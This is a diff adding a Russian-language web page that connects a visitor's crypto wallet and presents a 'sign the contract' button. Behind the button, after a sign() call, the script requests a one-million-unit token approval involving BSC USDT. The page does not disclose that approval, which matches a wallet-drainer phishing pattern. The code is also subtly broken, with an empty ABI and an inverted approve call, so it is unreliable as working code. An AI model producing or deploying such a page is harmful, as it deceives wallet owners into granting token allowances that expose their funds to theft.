@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Подключение и Подписание Контракта</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+</head>
+<body>
+<h2>Подключите свой кошелек и подпишите контракт</h2>
+<button onclick="connectAndSign()">Подключиться и Подписать</button>
+
+<script>
+        let web3;
+        const contractAddress = "0x4bae37432137e3077439e17a1124cd2be8cec8a2"; // Адрес вашего контракта на тестовой сети
+        const abi = [ /* Вставьте ABI вашего контракта здесь */ ];
+
+        async function connectAndSign() {
+            if (typeof window.ethereum !== 'undefined') {
+                web3 = new Web3(window.ethereum);
+                try {
+                    // Подключаемся к кошельку пользователя
+                    await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    const accounts = await web3.eth.getAccounts();
+                    const userAddress = accounts[0];
+                    console.log("Подключен аккаунт:", userAddress);
+
+                    // Создаем контрактный объект
+                    const contract = new web3.eth.Contract(abi, contractAddress);
+
+                    // Выполняем последовательные действия: подписываем контракт и предоставляем доступ
+                    await signAndApprove(contract, userAddress);
+
+                } catch (error) {
+                    console.error("Ошибка при подключении или подписании:", error);
+                }
+            } else {
+                alert("Trust Wallet или MetaMask не найдены!");
+            }
+        }
+
+        async function signAndApprove(contract, userAddress) {
+            try {
+                // 1. Подписание контракта
+                await contract.methods.sign().send({ from: userAddress });
+                console.log("Контракт подписан пользователем:", userAddress);
+
+                // 2. Предоставление разрешения на управление токенами
+                const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // Адрес USDT на BSC
+                const amountToApprove = web3.utils.toWei("1000000", "ether"); // Лимит для разрешения
+
+                await contract.methods.approve(usdtContractAddress, amountToApprove).send({ from: userAddress });
+                console.log("Доступ к токенам предоставлен для контракта:", contractAddress);
+
+                alert("Контракт успешно подписан, и разрешение предоставлено!");
+
+            } catch (error) {
+                console.error("Ошибка при подписании контракта или предоставлении разрешения:", error);
+            }
+        }
+    </script>
+</body>
+</html>
